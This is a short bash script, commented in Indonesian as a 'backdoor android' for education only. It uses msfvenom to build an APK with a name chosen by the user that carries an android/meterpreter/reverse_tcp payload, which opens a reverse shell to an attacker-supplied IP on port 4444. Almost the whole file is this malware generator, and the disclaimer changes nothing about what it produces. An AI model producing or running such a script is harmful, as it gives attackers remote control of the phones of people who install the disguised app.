#!/bin/bash
# backdoor android
# hanya untuk edukasi, jangan disalahgunakan.

payload="android/meterpreter/reverse_tcp"
lhost="<_ip_address_>"
lport="4444"
nama_aplikasi="<_nama_aplikasi.apk_>"
msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" R > "$nama_aplikasi"
